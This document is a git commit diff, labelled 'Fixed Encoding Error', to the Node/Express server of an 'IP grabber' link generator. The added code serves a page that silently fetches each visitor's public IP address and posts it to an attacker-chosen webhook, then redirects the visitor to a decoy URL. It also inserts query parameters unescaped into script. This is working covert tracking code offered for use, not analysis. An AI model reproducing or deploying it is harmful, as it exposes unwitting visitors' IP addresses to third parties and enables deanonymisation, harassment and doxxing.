3521493635bde4a619e4e98a4a08e92f8f2408db
Rami M <86711160+PythonRam9@users.noreply.github.com>
2021-09-08 01:10:39 +0000

    Fixed Encoding Error

--- index.js
+++ index.js
@@ -4,7 +4,30 @@ const path = require('path');
 
 app.get('/', (req, res) => {
   if ("hook" in req.query && "redirect" in req.query) {
-    res.sendFile(path.join(__dirname+'/grabber.html'));
+    var payload_msg = "``` ```";
+    res.send(`<html><body><script>
+
+    function IPgrab()
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open('GET', '//api.ipify.org/?format=text');
+    xmlHttp.send( null );
+    var IP =  xmlHttp.responseText;
+
+    var request = new XMLHttpRequest();
+    request.open('POST', '${ req.query.hook }');
+
+    request.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        content: '**XYZ IP Grabber** | ' + IP
+    }
+
+    request.send(JSON.stringify(params));
+
+    window.location.replace('${ req.query.redirect }');
+}
+    </script></body></html>`);
   } else {
     res.sendFile(path.join(__dirname+'/index.html'));
   }
@@ -12,8 +35,8 @@ app.get('/', (req, res) => {
 
 app.get('/create', (req, res) => {
   if ("hook" in req.query && "redirect" in req.query) {
-    var new_URL = `https://xyz.webhooks.repl.co?hook=${ req.query.hook }&redirect=${ req.query.redirect }`
-    res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="100">${ new_URL }</textarea><br>`)
+    var new_URL = `https://xyz.webhooks.repl.co?hook=${ encodeURIComponent(req.query.hook) }&redirect=${ encodeURIComponent(req.query.redirect) }`
+    res.send(`<h1>Your Link has been generated succesfully</h1><br><textarea rows="1" cols="1000">${ new_URL }</textarea><br>`)
   }
 });
 
